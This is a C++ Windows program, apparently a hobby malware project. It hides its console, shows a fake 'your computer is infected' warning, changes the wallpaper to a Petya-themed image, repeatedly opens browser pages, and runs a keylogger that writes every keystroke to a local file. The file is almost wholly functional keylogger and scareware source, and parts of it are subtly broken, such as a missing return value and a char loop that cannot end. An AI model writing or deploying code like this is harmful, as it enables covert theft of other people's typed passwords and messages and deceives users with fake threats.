#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteData(std::string Text) {
    ofstream LogFile;
    LogFile.open("Keylogs.txt", fstream::app);
    LogFile << Text;
    LogFile.close();
}

void Stealth() {
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, 0);
}

bool isKeyListed(int vKey) {
    switch (vKey) {
        case VK_RETURN:
            WriteData("\n");
            break;
        case VK_SPACE:
            WriteData(" ");
            break;
        case VK_OEM_PERIOD:
            WriteData(".");
            break;
        default: return false;
    }
}

int main() {
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);
    Stealth();

    MessageBox(NULL, "Your computer is infected, to eliminate the threats you will be redirected to the page with our antivirus", "Warning", MB_OK | MB_ICONERROR);

    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)"C:\\Users\\gonch\\CLionProjects\\untitled2\\cmake-build-debug\\petya.png", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    ShellExecute(NULL, "open", "index.html", NULL, NULL, SW_SHOWNORMAL);

    int i = 0;
    while(i < 10){
        ShellExecute(NULL, "open", "https://www.google.com/search?client=firefox-b-d&sca_esv=f35a62b2f11118f0&sca_upv=1&sxsrf=ACQVn09O6ni6aa0TI0mOD7nkUCwaToOIRw:1711562138822&q=skyn&uds=AMwkrPtMsdZ6jPhA5S-jYzjfaBw0wj8WwWvnwZVHELRbVV39hkDF3CcCmNQBjQBWhfXmo4BIRNyLSejFxt4ATPxDnCBlEh8az9-0eUigdLzv6uLHHSO8qtpJfXqIe0tt98dAABZE-SRsB56-PXMIsFq_QAN4uYBE6JydmeO5n1Jt2zF-iAs9cxThSp_J_Zb7wtCVrB7_79RhPXVtlk_yWUm1_rHzWLQY4-W_EiK2RZ1wJcaDo-d5FTpZ90k_5l383aJQqtkiFnm-dWk_0IM3By3eVwhEv_S_q5lx-xqGwiyaym3V-VUSiFF35jFMfQEJDzwaKw5QQi30&udm=2&prmd=sivnbz&sa=X&ved=2ahUKEwipk67qgZWFAxWJ7LsIHXl8CH4QtKgLegQIDRAB", NULL, NULL, SW_SHOWNORMAL);
        i++;
    }

    char Key;
    while (1) {
        for (Key = 8; Key <= 255; Key++) {
            if (GetAsyncKeyState(Key) == -32767) {
                if (isKeyListed(Key) == 0) {
                    ofstream LogFile;
                    LogFile.open("Keylogs.txt", fstream::app);
                    LogFile << Key;
                    LogFile.close();
                }
            }
        }
    }

    return 0;
}